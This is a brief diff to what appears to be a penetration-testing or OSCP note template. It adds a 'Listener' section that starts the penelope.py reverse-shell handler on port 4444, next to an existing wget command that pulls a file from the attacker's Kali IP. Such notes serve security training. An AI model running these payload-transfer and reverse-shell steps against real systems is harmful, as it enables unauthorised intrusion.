@@ -46,6 +46,12 @@ const command = `wget http://${KaliIP}:8888/[file]`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+Listener
+
+```
+cd ~/Desktop/Tools && python3 penelope.py -p 4444 -O / --oscp-safe
+```
+
 ## Provided Credentials
 ---
 
